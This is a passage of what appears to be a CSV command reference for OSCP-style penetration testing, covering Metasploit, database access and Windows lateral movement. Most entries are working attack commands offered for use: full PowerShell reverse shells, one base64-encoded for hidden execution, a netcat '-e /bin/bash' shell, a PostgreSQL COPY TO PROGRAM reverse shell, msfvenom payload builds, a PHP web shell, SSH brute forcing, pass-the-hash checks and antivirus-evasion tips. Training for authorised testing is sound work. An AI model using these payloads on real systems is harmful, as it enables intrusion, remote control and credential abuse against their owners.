Meterpreter payloads provide advanced features but are larger.

Shell payloads are simpler and smaller.","high","","","","{""incompatible_payload"": ""Use 'show payloads' to see compatible payloads only""}","","[""msf-use-module"", ""msf-show-payloads""]","","[""msf-set-lhost"", ""msf-exploit-run""]"
"msf-set-lhost","Set Listener Host (Attacker IP)","exploitation","set LHOST <ATTACKER_IP>","Configure local IP address for reverse shell connection or bind shell interface","metasploit","set LHOST 192.168.45.5","Common mistake:
using wrong IP on multi-homed systems.

For VPN connections, use tun0 or VPN IP.

Can use interface name:
set LHOST tun0","high","","","","{""wrong_interface"": ""Use interface name (eth0, tun0) instead of IP for VPN scenarios"", ""multiple_ips"": ""Specify correct IP if machine has multiple interfaces (check with: ip a)""}","","[""msf-set-payload""]","","[""msf-set-lport"", ""msf-exploit-run""]"
"msf-set-lport","Set Listener Port","exploitation","set LPORT <PORT>","Configure local port for listener (reverse shell) or bind port","metasploit","set LPORT 443","Default LPORT is 4444 (often blocked by firewalls).

Use ports 80, 443, or 53 for better success against egress filtering.

Requires root for ports < 1024.","high","","","","{""port_in_use"": ""Choose different port or kill process using it: sudo lsof -ti:<PORT> | xargs kill"", ""firewall_blocking"": ""Use common ports (80, 443, 53) to bypass egress filtering""}","","[""msf-set-payload""]","","[""msf-exploit-run""]"
"msf-show-targets","Display Exploit Targets","exploitation","show targets","List available target configurations for exploit module (OS versions, architectures, methods)","metasploit","","Target 0 is usually 'Automatic' detection.

Manual target selection more reliable if you know exact OS version.

Some modules have targets for different exploitation methods.","medium","","","","","","[""msf-use-module""]","","[""msf-set-target""]"
"msf-set-target","Set Exploit Target","exploitation","set target <TARGET_ID>","Manually select target configuration instead of relying on automatic detection","metasploit","set target 1","Manual target selection recommended if automatic detection fails.

Choosing wrong target may crash service or fail silently.","medium","","","","{""wrong_target"": ""Verify target OS version matches module target exactly""}","","[""msf-show-targets""]","","[""msf-exploit-run""]"
"msf-exploit-check","Check Vulnerability Without Exploiting","exploitation","check","Verify target vulnerability without attempting exploitation (if module supports checking)","metasploit","","Use 'check' before exploitation to verify vulnerability without risk of crashing service.

'Check supported:
Yes' shown in module info.

Some checks are version-based only (may have false positives/negatives).","high","","","","{""check_not_supported"": ""Review module info - not all modules support checking"", ""false_negative"": ""Some checks are unreliable - try exploit if confident""}","","[""msf-use-module"", ""msf-set-option""]","","[""msf-exploit-run""]"
"msf-exploit-run","Run Exploit Module","exploitation","exploit","Execute the configured exploit module and launch payload","metasploit","","Use 'exploit -j' to run in background and continue working.

Session auto-created on success.

Exploit failures common - try different payloads, targets, or manual exploitation.","high","","","","{""no_session_created"": ""Check: 1) Target vulnerable? 2) Network connectivity? 3) Payload compatible? 4) Firewall blocking?"", ""exploit_crashed_service"": ""Target may be patched or wrong target selected"", ""handler_not_started"": ""Verify LHOST/LPORT set correctly and port available""}","{""exploit"": ""Run exploit and interact with session if successful"", ""run"": ""Alias for 'exploit'"", ""exploit -j"": ""Run exploit as background job"", ""exploit -z"": ""Don't interact with session after success (background)"", ""run -j"": ""Run as background job (same as exploit -j)""}","[""msf-use-module"", ""msf-set-payload"", ""msf-set-lhost"", ""msf-set-lport""]","","[""msf-session-interact"", ""msf-session-background""]"
"msf-sessions-list","List Active Sessions","exploitation","sessions -l","Display all active sessions created by exploits or auxiliary modules","metasploit","","Session IDs are sequential integers.

Type shows payload used (meterpreter, shell, etc).

Use session ID to interact with specific target.","high","","","","","{""sessions"": ""List active sessions (same as sessions -l)"", ""sessions -l"": ""List all sessions with details"", ""sessions -v"": ""Verbose listing with more information"", ""sessions -K"": ""Kill all sessions""}","","","[""msf-session-interact""]"
"msf-session-interact","Interact with Session","exploitation","sessions -i <SESSION_ID>","Switch to interactive mode with specified session","metasploit","sessions -i 1","Background active session with Ctrl+Z.

Sessions persist until explicitly killed or connection lost.

Multiple sessions manageable simultaneously.","high","","","","{""session_died"": ""Session may have closed - check with: sessions -l"", ""no_interaction"": ""Some sessions timeout - regenerate payload if lost""}","{""-i"": ""Interact with session"", ""-k"": ""Kill specified session"", ""-c"": ""Run command on session""}","[""msf-sessions-list""]","","[""meterpreter-sysinfo""]"
"msf-session-background","Background Active Session","exploitation","background","Send current session to background and return to msfconsole prompt","metasploit","","Use Ctrl+Z as shortcut.

Session remains active in background.

Return to session with:
sessions -i <ID>","high","","","","","","[""msf-session-interact""]","","[""msf-session-interact"", ""msf-use-module""]"
"msf-jobs-list","List Background Jobs","exploitation","jobs","Display all running background jobs (exploits, handlers, auxiliary modules)","metasploit","","Jobs are background tasks - exploits running with -j, multi/handler listeners, etc.

Jobs don't equal sessions - jobs create sessions.

Kill listener with:
jobs -k <ID>","medium","","","","{""job_not_stopping"": ""Kill forcefully with: jobs -k <ID>""}","{""jobs"": ""List all jobs"", ""jobs -K"": ""Kill all jobs"", ""jobs -k <ID>"": ""Kill specific job""}","","",""
"mysql-connect-basic","MySQL Database Connection","exploitation","mysql -h <TARGET> -P <PORT> -u <USERNAME> -p'<PASSWORD>'","Connect to MySQL/MariaDB database with credentials for enumeration and data extraction","database","mysql -h 192.168.45.100 -P 3306 -u root -p'password123'","MySQL default port:
3306.

Check information_schema for database structure.

Time estimate:
1-2 minutes.

OSCP tips:
(1) Enumerate databases:
SHOW DATABASES; (2) Look for:
users, admin, accounts, customers tables.

(3) Common columns:
username, password, email, hash.

(4) Extract hashes:
SELECT user,password FROM mysql.user; (5) Check file read permissions:
SELECT LOAD_FILE('/etc/passwd'); (6) UDF privilege escalation if admin:
linux-mysql-udf.

(7) For scripting:
mysql -h <TARGET> -u <USER> -p'<PASS>' -e 'SHOW DATABASES;'.

(8) Common usernames:
root, admin, dbuser, webapp.","high","","","","{""Access denied for user"": ""Wrong credentials or user lacks remote access. Check: SELECT user,host FROM mysql.user; (needs admin access)"", ""Can't connect to MySQL server"": ""Service down or port wrong. Verify: sudo nmap -p 3306 -Pn <TARGET>"", ""ERROR 1130: Host not allowed"": ""Your IP blocked by MySQL firewall. User may only allow localhost connections: GRANT ALL ON *.* TO '<USER>'@'%' IDENTIFIED BY '<PASS>';"", ""mysql command not found"": ""Install client: sudo apt install mysql-client or default-mysql-client""}","{""-h"": ""MySQL server hostname or IP address"", ""-P"": ""Port number (uppercase P for port, default 3306)"", ""-u"": ""MySQL username for authentication"", ""-p"": ""Password (no space between -p and password to avoid prompt)""}","","[""sqli-union-mysql-info""]",""
"postgres-connect-basic","PostgreSQL Database Connection","exploitation","psql -h <TARGET> -p <PORT> -U <USERNAME> -d <DATABASE>","Connect to PostgreSQL database with credentials for enumeration and potential code execution","database","psql -h 192.168.45.100 -p 5432 -U postgres -d postgres","PostgreSQL default port:
5432.

Default database:
postgres.

Default superuser:
postgres.

Time estimate:
1-2 minutes.

OSCP tips:
(1) List databases:
\l or SELECT datname FROM pg_database; (2) Connect to database:
\c <db> (3) List tables:
\dt or SELECT tablename FROM pg_tables WHERE schemaname='public'; (4) Check if superuser:
SELECT current_user, usesuperuser FROM pg_user WHERE usename=current_user; (5) File read (if superuser):
postgres-file-read.

(6) Command execution (if superuser):
COPY (SELECT '') TO PROGRAM 'bash -c ""bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1""'; (7) For scripting:
PGPASSWORD='<PASS>' psql -h <TARGET> -U <USER> -d postgres -c 'SELECT version();'","high","","","","{""password authentication failed"": ""Wrong credentials. PostgreSQL is case-sensitive. Verify username/password from config files"", ""FATAL: database does not exist"": ""Specify database: -d postgres (common default) or omit -d flag"", ""could not connect to server"": ""Service down or port wrong. Verify: sudo nmap -p 5432 -Pn <TARGET>"", ""FATAL: no pg_hba.conf entry"": ""Your IP not whitelisted. Admin must add: host all all <YOUR_IP>/32 md5 to pg_hba.conf"", ""psql command not found"": ""Install client: sudo apt install postgresql-client""}","{""-h"": ""PostgreSQL server hostname or IP address"", ""-p"": ""Port number (lowercase p for port, default 5432)"", ""-U"": ""PostgreSQL username for authentication (uppercase U)"", ""-d"": ""Database name to connect to (default: same as username)""}","","[""postgres-direct-connect"", ""sqli-union-postgresql-info""]","[""postgres-privilege-check"", ""postgres-file-read""]"
"wmi-creds-pscredential","Helper - Create PSCredential Object for WMI/WinRM","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password)","Create PowerShell credential object for use in WMI, WinRM, and other remoting commands","lateral-movement","$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\jen', $password)","EDUCATIONAL CONTEXT:
PSCredential is PowerShell object encapsulating username and encrypted password for remote authentication.

WHY NEEDED:
Many PowerShell remoting cmdlets require PSCredential object, not plain strings.

SECURITY:
SecureString encrypts password in memory using DPAPI (Data Protection API) - not plaintext.

REUSABILITY:
Create $credential once at session start, reuse in multiple commands (Invoke-Command, New-PSSession, Invoke-WmiMethod, etc.).

ALTERNATIVE:
Get-Credential provides interactive prompt (better OPSEC - no password in command history or logs).

VERIFICATION:
Test credential with $credential.GetNetworkCredential().Password to view plaintext (debugging only).

BEHIND THE SCENES:
PSCredential stores username as string, password as SecureString (encrypted).

TIME ESTIMATE:
<30 seconds to create.

EXAM TIP:
Create credential object at start of session, reuse throughout lateral movement commands.

Saves typing and reduces errors.","high","","","","{""Special characters in password"": ""Use single quotes around password to prevent PowerShell interpretation: '<PASS>'"", ""Password visible in history"": ""Use $password = Read-Host -AsSecureString for sensitive scenarios (no plaintext)"", ""Domain format error"": ""Use 'corp\\jen' not 'jen@corp.com' for username format"", ""Cannot convert to SecureString"": ""Verify password string is valid. Test with: '<PASS>'.GetType()""}","{""ConvertTo-SecureString"": ""Convert plaintext password to SecureString object (encrypted in memory)"", ""-AsPlainText"": ""Allow plaintext input (normally requires interactive prompt)"", ""-Force"": ""Bypass security warning for plaintext password"", ""New-Object System.Management.Automation.PSCredential"": ""Create credential object with username and SecureString password"", ""Get-Credential"": ""Interactive alternative - prompts user for username/password (better OPSEC)""}","","",""
"revshell-ps-generator","Helper - Generate Base64 PowerShell Reverse Shell","active-directory","python3 -c ""import base64; LHOST='<LHOST>'; LPORT='<LPORT>'; payload = f'\$client = New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \""PS \"" + (pwd).Path + \""> \"";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()'; encoded = base64.b64encode(payload.encode('utf16')[2:]).decode(); print(encoded)""","Python one-liner to generate base64-encoded PowerShell reverse shell with custom LHOST/LPORT for lateral movement","lateral-movement","python3 -c ""import base64; LHOST='192.168.45.200'; LPORT='443'; payload = f'\$client = New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \""PS \"" + (pwd).Path + \""> \"";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()'; encoded = base64.b64encode(payload.encode('utf16')[2:]).decode(); print(encoded)""","EDUCATIONAL CONTEXT:
One-liner Python script to generate ready-to-use base64-encoded PowerShell reverse shell.

WHY USE THIS:
Fast payload generation during exploitation, customizable LHOST/LPORT for different scenarios.

HOW IT WORKS:
1) TCPClient connects to LHOST:LPORT, 2) Loop reads commands from attacker, 3) Execute with iex (Invoke-Expression), 4) Send output back over TCP, 5) Repeat until connection closed.

PAYLOAD STRUCTURE:
TCP connection  GetStream  Read commands  Execute  Send output  Loop.

BASE64 ENCODING:
Avoids command-line escaping issues, bypasses basic signature detection (not AV-proof).

UTF-16LE REQUIREMENT:
PowerShell -EncodedCommand expects UTF-16 Little Endian encoding with BOM removed.

OBFUSCATION:
Base64 provides basic evasion but not sophisticated AV bypass.

USAGE:
Copy output, use in lateral movement command like:
powershell -nop -w hidden -e <BASE64>.

TIME ESTIMATE:
<1 minute for generation + execution.

EXAM TIP:
Save as script file (generate_revshell.py) for quick access.

Pre-generate payloads for common LHOST values (tun0 IP) before exam start.","high","","","","{""Python syntax error"": ""Ensure LHOST/LPORT properly substituted in command"", ""No callback when executed"": ""Verify LHOST reachable from target. Test with: Test-NetConnection <LHOST> -Port <LPORT>"", ""Connection drops immediately"": ""Firewall blocking outbound. Check target egress filtering"", ""Antivirus blocks payload"": ""Obfuscate payload with Invoke-Obfuscation or use alternative technique"", ""Base64 decode error"": ""Verify UTF-16LE encoding: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))""}","{""TCPClient('<LHOST>',<LPORT>)"": ""Creates TCP connection to attacker IP and port"", ""GetStream()"": ""Get network stream for bidirectional read/write"", ""while loop"": ""Continuously read commands from attacker, execute, send output back"", ""iex $data"": ""Execute received commands (Invoke-Expression alias)"", ""Out-String"": ""Convert command output objects to string for transmission"", ""pwd"": ""Current directory path for PowerShell prompt simulation"", ""encode('utf16')[2:]"": ""PowerShell expects UTF-16LE encoding, [2:] removes BOM (Byte Order Mark)"", ""base64.b64encode()"": ""Encode payload to base64 for -EncodedCommand parameter""}","","",""
"nc-listener-tcp","Helper - Netcat TCP Listener for Reverse Shells","active-directory","nc -lvnp <LPORT>","Start Netcat listener on Kali to catch incoming reverse shell connections from lateral movement payloads","lateral-movement","nc -lvnp 443","EDUCATIONAL CONTEXT:
Netcat listener is essential component of reverse shell workflow - attacker-side receiver for callbacks.

WHY REVERSE SHELL:
Target connects back to attacker (bypasses inbound firewall rules).

COMMON PORTS:
443 (HTTPS - often allowed outbound), 4444 (default Metasploit), 80 (HTTP), 53 (DNS).

LISTENER TIMING:
Start listener BEFORE executing reverse shell payload on target.

RLWRAP RECOMMENDATION:
Use 'rlwrap nc -lvnp <LPORT>' for better interactivity (arrow keys, command history).

STABILIZATION:
Raw Netcat shells are unstable - stabilize with:
python -c 'import pty;pty.spawn(""/bin/bash"")' then Ctrl+Z, stty raw -echo; fg.

ALTERNATIVE:
pwncat-cs provides built-in stabilization, file upload/download, persistence modules.

BEHIND THE SCENES:
Netcat binds to port, accepts TCP connection, bidirectional data transfer (stdin/stdout).

TIME ESTIMATE:
<10 seconds to start listener.

EXAM TIP:
Always start listener before executing payload.

Use rlwrap for better UX.

Keep listener in tmux/screen pane for persistence.","high","","","","{""Address already in use"": ""Port conflict. Check what's using port: sudo lsof -i:<LPORT>. Kill process or use different port"", ""Permission denied"": ""Ports <1024 require root. Use sudo or choose port >1024 (e.g., 4444, 443 without sudo won't work)"", ""No connection received"": ""Verify payload has correct LHOST/LPORT. Check target firewall allows outbound to <LPORT>"", ""Connection drops immediately"": ""Payload error or AV killed process. Check payload syntax. Test locally first"", ""No arrow keys work"": ""Use rlwrap: rlwrap nc -lvnp <LPORT> for readline support""}","{""-l"": ""Listen mode - wait for incoming connections"", ""-v"": ""Verbose - show connection details (IP, port)"", ""-n"": ""Numeric only - don't resolve DNS names (faster)"", ""-p <LPORT>"": ""Port to listen on"", ""rlwrap"": ""Readline wrapper - provides arrow keys, command history in shell"", ""-e /bin/bash"": ""Execute /bin/bash on connect (dangerous - don't use in listener mode)""}","","",""
"verify-root-access-ad","Helper - Verify Remote Access and Privileges","active-directory","whoami; hostname; whoami /priv","Quick verification commands to confirm remote shell access, identify target system, and check privilege level","lateral-movement","","EDUCATIONAL CONTEXT:
First commands to run after obtaining remote shell - verify access and assess privilege level.

WHY THESE COMMANDS:
whoami confirms user context, hostname confirms target, whoami /priv shows available privileges for escalation.

SYSTEM vs ADMIN:
NT AUTHORITY\SYSTEM is highest privilege (kernel-level), local admin is high but not SYSTEM.

PRIVILEGE ESCALATION:
If SeImpersonatePrivilege present, can use Juicy Potato/PrintSpoofer/RoguePotato for SYSTEM.

COMMON CONTEXTS:
PSExecSYSTEM, WMIuser, WinRMuser, DCOMuser.

GROUP MEMBERSHIP:
whoami /groups shows if user in Administrators local group.

SID IDENTIFICATION:
whoami /all shows SID - useful for token manipulation.

TIME ESTIMATE:
<10 seconds to run all three commands.

EXAM TIP:
Always verify access immediately after shell obtained - confirms success and informs next steps (credential dump if SYSTEM, PrivEsc if user).","high","","","","{""whoami not found"": ""Unlikely on Windows. Verify shell is Windows not Linux"", ""Access denied on whoami /priv"": ""Very unlikely. Verify shell is responsive: echo test"", ""Wrong user context"": ""Payload executed as different user. Check credential used in lateral movement"", ""Wrong hostname"": ""Connected to wrong target. Verify IP in payload matches intended target""}","{""whoami"": ""Display current user context (domain\\username or NT AUTHORITY\\SYSTEM)"", ""hostname"": ""Display computer name (confirms correct target)"", ""whoami /priv"": ""Display current privileges (SeImpersonatePrivilege, SeDebugPrivilege, etc.)"", ""whoami /all"": ""Display user, groups, SID, and all privileges (comprehensive)"", ""whoami /groups"": ""Display group memberships (Administrators, Remote Management Users, etc.)""}","","",""
"lateral-movement-port-check","Helper - Quick Port Check for Lateral Movement Options","active-directory","sudo nmap -p 135,445,5985,5986,3389 -Pn -sV -v <TARGET>","Rapidly scan common lateral movement ports on target to determine available attack vectors","lateral-movement","sudo nmap -p 135,445,5985,5986,3389 -Pn -sV -v 192.168.50.73","EDUCATIONAL CONTEXT:
Quick reconnaissance to determine viable lateral movement vectors before attempting exploitation.

PORT MEANINGS:
135=RPC (WMI/DCOM), 445=SMB (PSExec/SMBExec), 5985=WinRM HTTP, 5986=WinRM HTTPS, 3389=RDP.

TECHNIQUE MAPPING:
Use port availability to select lateral movement technique (see decision tree).

FAST SCAN:
Only 5 ports - completes in <1 minute vs full 65535 port scan.

TECHNIQUE PRIORITY:
If multiple ports open, try WinRM first (cleanest), then PSExec (most reliable), then WMI/DCOM (stealthier).

COMPARISON:
More targeted than full nmap scan, faster than testing each technique individually.

SERVICE DETECTION:
-sV identifies exact service version (e.g., WinRM vs generic HTTP on 5985).

BEHIND THE SCENES:
Nmap sends SYN packets to ports, analyzes responses, fingerprints services with version probes.

TIME ESTIMATE:
30 seconds to 1 minute for port scan.

EXAM TIP:
Run this immediately after identifying target to plan lateral movement approach.

Saves time by focusing on available techniques only.","high","","","","{""All ports filtered"": ""Firewall blocking - may need pivoting or alternative access path"", ""Host seems down"": ""Verify IP correct: ping <TARGET>. If pingable but ports filtered, use -Pn (already included)"", ""Slow scan"": ""Add -T4 for faster timing (aggressive): sudo nmap -p 135,445,5985,5986,3389 -Pn -sV -v -T4 <TARGET>"", ""Connection timeout"": ""Network unreachable. Check routing: ip route get <TARGET>""}","{""-p 135,445,5985,5986,3389"": ""Scan specific lateral movement ports (RPC, SMB, WinRM HTTP/HTTPS, RDP)"", ""-Pn"": ""Skip ping check - treat host as up (bypass ICMP filtering)"", ""-sV"": ""Service version detection - identify exact service/version"", ""-v"": ""Verbose output - show progress during scan"", ""sudo"": ""Required for SYN scan and accurate OS/service detection""}","","",""
"lateral-movement-troubleshooting","Helper - Troubleshoot Common Lateral Movement Failures","active-directory","# Test credentials: crackmapexec smb <TARGET> -u <USER> -p <PASS>
# Test admin access: crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares
# Test hash: crackmapexec smb <TARGET> -u <USER> -H <NTLM>
# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH
# Verify ports: sudo nmap -p 135,445,5985 -Pn -v <TARGET>
# Check firewall: Test-NetConnection <TARGET> -Port <PORT> from Windows
# Time sync: net time \\<DC> (Kerberos requires <5 min time skew)
# Service status: Get-Service WinRM,RpcSs -ComputerName <TARGET>","Systematic troubleshooting guide for diagnosing authentication failures, connection timeouts, and access denied errors","lateral-movement","# Test credentials: crackmapexec smb 192.168.45.100 -u admin -p password
# Test admin access: crackmapexec smb 192.168.45.100 -u admin -p password --shares
# Test hash: crackmapexec smb 192.168.45.100 -u admin -H abc123...
# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH
# Verify ports: sudo nmap -p 135,445,5985 -Pn -v 192.168.45.100
# Check firewall: Test-NetConnection 192.168.45.100 -Port 80 from Windows
# Time sync: net time \\192.168.45.100 (Kerberos requires <5 min time skew)
# Service status: Get-Service WinRM,RpcSs -ComputerName 192.168.45.100","EDUCATIONAL CONTEXT:
Systematic troubleshooting framework for lateral movement failures - saves exam time.

COMMON CAUSES:
1) Invalid credentials (most common), 2) User not admin (second most common), 3) UAC remote restrictions (hash-based auth), 4) Firewall blocking ports, 5) Time skew (Kerberos), 6) Service disabled.

TROUBLESHOOTING ORDER:
Test credentials  Verify admin access  Check ports  Verify services  Check time sync.

UAC LIMITATION:
2014 KB2871997 patch blocks local admin pass-the-hash for non-RID-500 accounts (domain users unaffected).

CRACKMAPEXEC VERIFICATION:
Always test with CME before full exploitation - fastest way to verify credentials and admin access.

PWNED MEANING:
[+] Pwn3d! indicator confirms user has local administrator rights (can PSExec/WMI).

TIME SKEW:
Kerberos authentication fails if clock difference >5 minutes from DC - sync with ntpdate or net time.

FIREWALL:
If ports show 'filtered' in nmap, lateral movement impossible without pivoting.

SERVICE DEPENDENCIES:
WinRM requires WinRM service, WMI requires RpcSs (RPC), PSExec requires Server service.

TIME ESTIMATE:
5-10 minutes for full troubleshooting workflow.

EXAM TIP:
Don't waste time on blocked techniques - verify prerequisites first, pivot to alternatives if blocked.","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Verify username/password correct. Test with: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""STATUS_ACCESS_DENIED"": ""User authenticated but not local admin. Verify admin group membership: net user <USER> /domain"", ""No Pwn3d! but authentication succeeds"": ""User not in Administrators local group. PSExec/WMI will fail. Try different user or PrivEsc"", ""UAC restriction (local admin hash fails)"": ""2014 Microsoft patch blocks non-RID-500 local admin PTH. Use domain user or find RID 500 Administrator hash"", ""Connection timeout"": ""Firewall blocking ports. Verify with: sudo nmap -p 135,445,5985 -Pn -v <TARGET>"", ""RPC server unavailable"": ""Port 135 filtered or RPC service disabled. Use alternative: WinRM (5985) or SMB (445) only techniques"", ""Kerberos time skew"": ""Clock difference >5 minutes. Sync time: sudo ntpdate <DC_IP> or net time \\\\<DC> /set /yes"", ""Service not running"": ""WinRM or RPC service disabled. Enable remotely if admin: Set-Service WinRM -StartupType Automatic -Status Running""}","{""crackmapexec smb"": ""Test SMB authentication and admin access"", ""--shares"": ""Verify ADMIN$ share accessible (confirms admin rights)"", ""-H <NTLM>"": ""Test pass-the-hash with NTLM hash"", ""sudo nmap -p 135,445,5985"": ""Verify required ports open for lateral movement"", ""Test-NetConnection -Port"": ""PowerShell connectivity test to specific port"", ""net time \\\\<DC>"": ""Check time difference with Domain Controller (Kerberos requirement)"", ""Get-Service WinRM,RpcSs"": ""Verify required services running on target""}","","",""
"lateral-movement-decision-tree","Lateral Movement Technique Selection Guide","active-directory","crackmapexec smb <TARGET> -u <USER> -p '<PASS>' --shares","Decision framework for selecting optimal lateral movement technique based on available credentials and target configuration","lateral-movement","crackmapexec smb 192.168.50.73 -u admin -p 'Password123' --shares","DECISION TREE:
1) Have password?  PSExec, WMI, WinRM, DCOM
2) Have NTLM hash?  Pass-the-Hash with pth-winexe, evil-winrm -H, impacket-psexec
3) Have Kerberos ticket?  Pass-the-Ticket
4) Need stealth?  WMI (no disk artifacts) > DCOM > WinRM > PSExec
5) Port 5985 open?  WinRM (fastest)
6) Only 445 open?  PSExec, SMBExec
7) Need to avoid SMB?  WMI (135), DCOM (135+RPC)

Start with CME validation, then select technique based on open ports and stealth requirements.","high","","","","","{""--shares"": ""Also enumerate accessible shares to verify admin$ access""}","","",""
"nc-reverse-shell","Netcat Reverse Shell","exploitation","nc -e /bin/bash <LHOST> <LPORT>","Netcat reverse shell with execute","","nc -e /bin/bash 10.10.14.5 4444","Not all netcat versions support -e flag","high","","","","","{""-e"": ""Execute program after connection (not available in all versions)"", ""/bin/bash"": ""Shell to execute upon connection""}","[""nc-listener"", ""nc-listener-setup""]","[""bash-reverse-shell"", ""python-reverse-shell"", ""netcat-reverse-shell-mkfifo""]","[""python-shell-upgrade"", ""linpeas-run"", ""winpeas-run""]"
"powershell-reverse-shell","PowerShell Reverse Shell","exploitation","powershell -nop -c ""$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""","PowerShell TCP reverse shell","","powershell -nop -c ""$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""","Use -exec bypass for execution policy issues","high","","","","","{""-nop"": ""No profile - skip PowerShell profile loading"", ""-c"": ""Execute command"", ""-exec bypass"": ""Bypass execution policy (add if needed)""}","[""nc-listener"", ""nc-listener-setup""]","[""msfvenom-windows-reverse"", ""msfvenom-windows-exe"", ""msfvenom-powershell-reverse""]","[""winpeas-run"", ""powerup-run"", ""privesccheck-run""]"
"msfvenom-linux-elf","MSFVenom Linux Binary","exploitation","msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > <FILE>","Generate Linux reverse shell binary","","msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf > shell.elf","Check target architecture (x86 vs x64)","high","","","","","{""-p"": ""Payload to generate"", ""LHOST="": ""Local host (attacker IP)"", ""LPORT="": ""Local port for listener"", ""-f"": ""Output format (elf for Linux executable)"", "">"": ""Redirect output to file""}","","[""msfvenom-linux-reverse-tcp""]",""
"msfvenom-windows-exe","MSFVenom Windows Binary","exploitation","msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe > <FILE>","Generate Windows reverse shell executable","","msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > shell.exe","May trigger AV, consider encoding","high","","","","","{""-p"": ""Payload to generate"", ""windows/x64/"": ""Windows 64-bit architecture"", ""-f exe"": ""Output format as Windows executable"", ""-e"": ""Encoder (add -e x86/shikata_ga_nai for AV evasion)""}","","[""msfvenom-linux-reverse-tcp""]",""
"searchsploit","Searchsploit Exploit Search","exploitation","searchsploit <SERVICE> <VERSION>","Search for exploits in Exploit-DB","","searchsploit apache 2.4.49","Use -x to examine exploit code, -m to copy","high","","","","","{""-x"": ""Examine exploit code"", ""-m"": ""Mirror/copy exploit to current directory"", ""-www"": ""Show exploitdb.com URL"", ""--nmap"": ""Parse nmap XML output file""}","[""nmap-service-scan"", ""whatweb-enum""]","[""searchsploit-cve-lookup"", ""searchsploit-service-version""]","[""searchsploit-copy-exploit"", ""nc-listener"", ""python-shell-upgrade""]"
"hydra-ssh","SSH Brute Force","exploitation","hydra -l <USERNAME> -P <WORDLIST> ssh://<TARGET>","Brute force SSH login","","hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100","Use -t to limit threads and avoid detection","medium","","","","","{""-l"": ""Single username"", ""-L"": ""Username list file"", ""-p"": ""Single password"", ""-P"": ""Password list file"", ""-t"": ""Number of parallel tasks (default 16)""}","","",""
"web-shell-php","Simple PHP Web Shell","exploitation","<?php system($_GET['cmd']); ?>","Minimal PHP web shell","","","Access with: ?cmd=whoami","high","","","","","{""system()"": ""Execute system command and display output"", ""$_GET['cmd']"": ""Get command from URL parameter"", ""$_POST['cmd']"": ""Alternative using POST for stealth""}","[""gobuster-dir-common""]","[""powershell-reverse-shell"", ""nc-reverse-shell"", ""bash-reverse-shell""]","[""nc-reverse-shell"", ""python-shell-upgrade"", ""linpeas-run"", ""winpeas-run""]"
"searchsploit-cve-lookup","Searchsploit CVE Lookup","exploitation","searchsploit --cve <CVE_ID>","Search Exploit-DB by specific CVE identifier","general","searchsploit --cve CVE-2021-44228","ExploitDB is local database (/usr/share/exploitdb/), no internet required during OSCP exam.

Always read exploit code before execution - look for IP/port hardcoded values, required libraries (pip install), compilation steps (gcc), and target OS compatibility.

Time estimate:
